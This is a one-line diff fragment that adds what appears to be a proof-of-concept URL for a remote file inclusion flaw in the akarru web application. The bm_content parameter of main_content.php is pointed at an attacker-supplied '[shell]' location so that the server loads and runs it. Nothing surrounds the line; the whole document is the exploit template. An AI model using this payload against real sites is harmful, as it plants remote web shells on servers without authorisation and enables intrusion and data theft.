@@ -1,0 +1,1 @@
+http://www.example.com/[path]/akarru.gui/main_content.php?bm_content=[shell]
